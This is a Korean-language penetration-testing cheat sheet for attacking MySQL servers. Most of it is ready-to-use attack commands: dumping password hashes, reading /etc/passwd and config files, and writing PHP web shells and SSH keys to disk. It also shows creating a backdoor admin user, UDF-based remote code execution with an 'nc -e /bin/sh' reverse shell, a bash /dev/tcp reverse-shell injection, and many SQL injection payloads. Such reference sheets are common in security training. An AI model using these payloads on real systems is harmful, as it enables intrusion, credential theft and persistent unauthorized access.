---
sidebar_position: 4
---

# MySQL - 3306

MySQL 데이터베이스 연결 및 공격 기법 모음입니다.

## 연결 방법

### 기본 연결

```bash
mysql -u root -p
mysql -u <USERNAME> -p
mysql -u <USERNAME> -h <RHOST> -p
mysql -u <USERNAME> -h <RHOST> -p<PASSWORD>
mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
```

### 특정 데이터베이스 연결

```bash
mysql -u <USERNAME> -h <RHOST> -p <DATABASE>
```

## 기본 명령어

### 상태 및 정보 확인

```sql
STATUS;
SELECT version();
SELECT system_user();
SELECT user();
SELECT @@version;
SELECT @@hostname;
```

### 데이터베이스 열거

```sql
SHOW databases;
USE <DATABASE>;
```

### 테이블 열거

```sql
SHOW tables;
DESCRIBE <TABLE>;
SHOW COLUMNS FROM <TABLE>;
```

### 데이터 조회

```sql
SELECT * FROM Users;
SELECT * FROM users \G;          -- 세로 형식으로 출력
SELECT Username,Password FROM Users;
```

### 사용자 및 권한 확인

```sql
SELECT user, authentication_string FROM mysql.user;
SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
SELECT grantee, privilege_type FROM information_schema.user_privileges;
```

## 파일 읽기/쓰기

### 파일 읽기

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\file.txt');
```

### 파일 쓰기

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'test' INTO OUTFILE '/tmp/test.txt';
```

### SSH 키 쓰기

```sql
SELECT "<SSH_PUBLIC_KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

## 데이터 조작

### 비밀번호 변경

```sql
UPDATE user SET password = '37b08599d3f323491a66feabbb5b26af' WHERE user_id = 1;
UPDATE mysql.user SET authentication_string = PASSWORD('newpassword') WHERE user = 'root';
FLUSH PRIVILEGES;
```

### 사용자 생성

```sql
CREATE USER 'hacker'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'localhost';
FLUSH PRIVILEGES;
```

## 명령 실행 기법

### 쉘 탈출

```sql
\! /bin/sh
\! bash
```

### UDF (User Defined Function)를 통한 RCE

lib_mysqludf_sys 사용:

```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('nc -e /bin/sh <LHOST> <LPORT>');
```

### Reverse Shell Injection

```sql
INSERT INTO users (id, email) VALUES (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

## SQL Injection 예제

### 인증 우회

```sql
admin' or '1'='1'--
admin' or 1=1--
' or 1=1--
' or '1'='1'-- -
```

### UNION 기반 Injection

#### 컬럼 수 찾기

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

#### 버전 확인

```sql
-1 UNION SELECT 1,2,version()-- -
' UNION SELECT null,version(),null-- -
```

#### 데이터베이스 이름

```sql
-1 UNION SELECT 1,2,database()-- -
' UNION SELECT null,database(),null-- -
```

#### 테이블 이름 열거

```sql
-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()-- -
```

#### 컬럼 이름 열거

```sql
-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='<TABLE>'-- -
```

#### 데이터 덤프

```sql
-1 UNION SELECT 1,2,group_concat(<COLUMN>) FROM <DATABASE>.<TABLE>-- -
' UNION SELECT null,group_concat(username,':',password),null FROM users-- -
```

### 파일 읽기 (Injection)

```sql
' UNION SELECT null,LOAD_FILE('/etc/passwd'),null-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
```

### Webshell 생성 (Injection)

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/shell.php"-- -
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/cmd.php'-- -
```

### Error-Based SQL Injection

```sql
' AND extractvalue(0x0a,concat(0x0a,database()))-- -
' AND extractvalue(0x0a,concat(0x0a,(SELECT user())))-- -
```

### Time-Based Blind SQL Injection

```sql
' AND SLEEP(5)-- -
' OR IF(1=1,SLEEP(5),0)-- -
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
```

### Boolean-Based Blind SQL Injection

```sql
' AND 1=1-- -  (True)
' AND 1=2-- -  (False)
' AND substring(database(),1,1)='a'-- -
```

## 데이터베이스 백업 및 복구

### 백업

```bash
mysqldump -u <USERNAME> -p <DATABASE> > backup.sql
mysqldump -u <USERNAME> -p --all-databases > all_backup.sql
```

### 복구

```bash
mysql -u <USERNAME> -p <DATABASE> < backup.sql
```

## 보안 설정 확인

```sql
SHOW VARIABLES LIKE 'secure_file_priv';   -- 파일 읽기/쓰기 제한 확인
SHOW VARIABLES LIKE '%log%';              -- 로그 설정 확인
SELECT @@global.read_only;                 -- 읽기 전용 모드 확인
```

## 참고

- MySQL은 기본적으로 3306 포트 사용
- `secure_file_priv` 설정이 파일 읽기/쓰기 제한
- `FILE` 권한이 있어야 LOAD_FILE/INTO OUTFILE 사용 가능
- UDF를 통한 RCE는 plugin_dir 쓰기 권한 필요
- `--skip-ssl`로 SSL 검증 우회 가능
- MariaDB도 대부분 동일한 명령어 사용
